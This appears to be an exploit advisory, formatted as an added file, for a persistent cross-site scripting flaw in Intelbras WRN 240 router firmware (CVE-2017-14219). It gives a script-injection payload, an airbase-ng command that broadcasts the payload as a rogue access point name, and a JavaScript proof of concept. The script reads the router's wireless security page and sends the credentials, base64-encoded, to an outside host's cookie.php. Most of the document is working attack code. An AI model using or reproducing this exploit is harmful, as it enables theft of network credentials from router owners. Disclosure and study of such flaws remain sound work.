@@ -1,0 +1,37 @@
+# Exploit Title: XSS persistent on intelbras router with firmware WRN 250
+# Date: 07/09/2017
+# Exploit Author: Elber Tavares
+# Vendor Homepage: http://intelbras.com.br/
+# Version: Intelbras Wireless N 150Mbps - WRN 240
+# Tested on: kali linux, windows 7, 8.1, 10
+
+# CVE-2017-14219
+
+For more info:
+
+
+http://whiteboyz.xyz/xss-roteador-intelbras-wrn-240html
+
+URL VULN: http://10.0.0.1/userRpm/popupSiteSurveyRpm.htm
+
+Payload: </script><script src='//elb.me'>
+
+"elb.me contains the malicious code on index"
+
+airbase-ng -e "</script><script src='//elb.me'>" -c 8 -v wlan0mon
+
+//requires an php script to get the logs
+
+PoC:
+
+var rawFile = new XMLHttpRequest();
+rawFile.onreadystatechange = function() {
+       alert(rawFile.responseText);
+       var base64 = rawFile.responseText.split('>')[1].split("/SCRIPT")[0];
+       //seleiciona a parte da página com as credenciais
+       new Image().src="https://elb.me/cookie.php?ck="+btoa(base64);
+       //envia as credenciais encodadas em base64
+};
+rawFile.open("GET", "http://10.0.0.1/userRpm/WlanSecurityRpm.htm", true);
+//pega a source da página /popupSiteSurveyRpm.htm
+rawFile.send();
